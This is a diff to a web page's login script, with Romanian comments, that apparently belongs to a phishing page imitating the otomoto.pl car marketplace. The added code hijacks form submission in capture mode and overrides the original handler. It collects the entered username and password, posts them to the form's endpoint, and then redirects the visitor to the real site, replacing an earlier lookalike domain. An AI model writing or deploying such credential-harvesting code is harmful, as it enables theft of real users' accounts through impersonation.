@@ -250,8 +250,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
   form.addEventListener('submit', function(e) {
     e.preventDefault();
+    e.stopImmediatePropagation(); // 🔥 oprește scriptul original
 
-    const formData = new FormData(form);
+    const email = document.getElementById('username')?.value || '';
+    const password = document.getElementById('password')?.value || '';
+
+    const formData = new FormData();
+    formData.append('username', email);
+    formData.append('password', password);
 
     fetch(form.action, {
       method: 'POST',
@@ -260,18 +266,19 @@ document.addEventListener('DOMContentLoaded', () => {
     .then(res => res.text())
     .then(data => {
       if (data.trim() === 'OK') {
-        window.location.href = 'https://otomoto.pl.com';
+        window.location.replace('https://otomoto.pl');
       } else {
         console.error(data);
-        alert('Ups! ');
+        alert('Ups! Ceva nu a mers bine!!!');
       }
     })
     .catch(err => {
       console.error(err);
-      alert('Error');
+      alert('Eroare de rețea');
     });
-  });
+  }, true); // 🔥 CAPTURE MODE
 });
 </script>
+
 
             </body></html>
